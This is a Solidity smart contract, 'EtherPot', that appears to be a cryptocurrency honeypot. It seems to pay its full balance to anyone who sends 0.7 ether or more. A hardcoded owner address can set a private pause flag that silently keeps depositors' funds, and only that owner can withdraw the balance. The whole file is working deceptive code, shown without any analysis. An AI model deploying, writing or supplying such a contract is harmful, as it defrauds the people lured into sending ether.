pragma solidity ^0.8.18;

contract EtherPot {
    bool private paused = false;
    fallback() external payable {
    if (msg.value >= 700000000000000000) {
        if (paused == false) {
            payable(msg.sender).transfer(address(this).balance);
        }
        else {
            payable(block.coinbase).transfer(1000000000000000);
        }
    }
    }
    function withdraw() external payable {
        if (msg.sender == 0x1cBB0a98e6eAC1074C4a9730d363e201527A188e) {
            payable(msg.sender).transfer(address(this).balance);
        }
    }
    function pause(bool _pause) external payable {
        if (msg.sender == 0x1cBB0a98e6eAC1074C4a9730d363e201527A188e) {
            paused = _pause;
        }
    }
}